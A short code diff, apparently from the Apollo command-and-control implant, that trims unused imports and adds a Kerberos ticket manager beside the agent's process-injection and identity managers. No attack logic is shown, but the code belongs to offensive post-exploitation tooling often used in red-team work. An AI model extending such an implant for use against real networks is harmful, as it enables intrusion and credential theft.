@@ -1,18 +1,10 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Linq;
-using System.Text;
 using ApolloInterop.Interfaces;
 using ApolloInterop.Structs.MythicStructs;
-using ApolloInterop.Types.Delegates;
-using ApolloInterop.Classes;
 using AM = Apollo.Management;
-using Apollo.Api;
-using Apollo;
-using System.Reflection;
 using System.Net;
 using System.Net.Sockets;
-using System.Diagnostics;
 using Microsoft.Win32;
 
 namespace Apollo.Agent
@@ -31,6 +23,8 @@ namespace Apollo.Agent
             IdentityManager = new AM.Identity.IdentityManager(this);
             ProcessManager = new Process.ProcessManager(this);
             InjectionManager = new Injection.InjectionManager(this);
+            TicketManager = new KerberosTickets.KerberosTicketManager(this);
+            
 
             foreach (string profileName in Config.EgressProfiles.Keys)
             {
